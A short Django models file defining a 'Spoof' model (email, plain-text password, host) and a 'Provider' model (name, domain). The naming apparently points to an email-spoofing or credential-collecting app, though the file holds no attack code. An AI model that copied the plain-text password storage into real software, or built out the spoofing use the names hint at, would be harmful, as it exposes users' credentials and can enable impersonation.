from django.db import models

# Create your models here.

class Spoof(models.Model):
	email = models.EmailField()
	password = models.CharField(max_length=255)
	host = models.TextField()


class Provider(models.Model):
	name = models.CharField(max_length=255)
	domain = models.CharField(max_length=255)